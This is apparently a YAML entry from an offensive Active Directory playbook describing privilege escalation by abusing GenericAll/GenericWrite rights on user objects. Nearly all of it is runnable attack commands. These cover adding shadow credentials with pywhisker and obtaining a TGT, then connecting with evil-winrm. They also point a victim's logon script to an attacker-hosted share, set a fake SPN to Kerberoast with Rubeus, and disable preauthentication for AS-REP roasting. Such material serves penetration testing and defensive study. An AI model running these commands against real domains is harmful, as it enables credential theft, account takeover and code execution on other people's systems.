title: GenericAll/GenericWrite permissions exploitation on Users
category: 
  - AD:
    - ACL:
      - Users  
tactic: Privilege Escalation
tags: []
description:
  - title: Overview
    content: GenericWrite allows to change user attributes. It can be used
      to add "Key Credentials" to the attribute msDS-KeyCredentialLink (shadow credentials), change the logon script,
      or targeted Kerberoasting/AS-REP roasting.
    references:
      - type: link
        value: https://habr.com/ru/companies/solarsecurity/articles/681108/
      - type: link
        value: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
      - type: link
        value: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

steps:
  - description: Use any of the possible abuse methods
    options: 
      - tool: pywhisker.py
        usage: |
          #Shadow credentials

          #Create and add a certificate to the object`s msDS-KeyCredentialLink attribute
          pywhisker.py -d "domain.com" -u "user" -p 'P@ssw0rd' --target "winrm_user" --action "add" -k

          #Use the pfx file to get a TGT using gettgtpkinit.py
          python3 gettgtpkinit.py domain.com/winrm_user -cert-pfx wAyBqump.pfx -pfx-pass OOMH7xA1c7yonbLr7EMM winrm_user.ccache

          #Connect using any of tools supporting kerberos
          KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.domain.com -r domain.com -u winrm_user

      - tool: powerview 
        usage: |
          #Overwrite the logon script path
          Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"

      - tool: powerview 
        usage: |
          #Targeted Kerberoasting
          #Set SPN
          Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}

          #Get Hash
          .\Rubeus.exe kerberoast /user:<username> /nowrap

          #Clean SPN
          Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
      
      - tool: powerview 
        usage: |
          #Targeted ASREPRoasting
          #You could make the user ASREPRoastable by disabling preauthentication and then ASREProast it.
          
          Set-DomainObject -Credential $creds -Identity <username> -XOR @{UserAccountControl=4194304}
  
comments:
  